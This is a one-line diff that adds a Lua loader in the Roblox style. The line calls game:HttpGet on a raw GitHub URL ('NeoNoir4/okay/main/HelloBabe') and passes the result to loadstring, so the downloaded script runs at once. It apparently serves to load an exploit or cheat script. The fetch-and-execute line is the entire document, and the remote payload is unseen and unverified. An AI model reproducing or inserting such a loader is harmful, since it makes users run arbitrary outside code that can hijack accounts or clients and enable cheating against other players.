@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NeoNoir4/okay/main/HelloBabe"))()
